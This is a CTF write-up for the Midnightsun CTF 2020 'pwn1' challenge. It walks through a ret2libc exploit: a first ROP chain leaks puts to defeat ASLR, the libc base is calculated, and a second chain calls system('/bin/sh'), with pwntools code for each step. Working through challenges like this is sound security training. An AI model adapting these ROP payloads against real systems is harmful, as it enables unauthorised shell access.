
## pwn1 (70pt)
### Description

> An homage to pwny.racing, we present... speedrun pwn challenges.
> These bite-sized challenges should serve as a nice warm-up for your pwning skills.


### Attachment

[pwn1](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MidnightsunCTF2020/pwn/pwn1/pwn1), [libc](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MidnightsunCTF2020/pwn/pwn1/libc.so)

### Analysis

just an general warming up task of ret2libc attack

### Solution

#### leak libc 

**ASLR** is enabled, so leak libc first:

```python
# elf, libc
main = 0x00400698

# rop1
offset = cyclic_find(0x61616173)
payload = cyclic(offset)
payload += p64(prdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(main)

ru('buffer: ')
# debug()
sl(payload)
```

#### calculate baseaddr

we can calculate the base address of libc by `puts-libc.sym['puts']` after `puts` in libc was leaked

```python
puts = uu64(rc(6))
info_addr("puts",puts)
libcbase = puts-libc.sym['puts']
```

address of other function/string in libc can be calculated as follow:

```python
system = libcbase+libc.sym['system']
binsh  = libcbase+libc.search('/bin/sh').next()
```

#### getshell

finally, execute `system('/bin/sh')`

```python
# rop2
ru('buffer: ')
payload = cyclic(offset)
payload += p64(ret) + p64(prdi) + p64(binsh) + p64(system) + p64(main)
# debug()
sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/MidnightsunCTF2020/pwn/pwn1) 

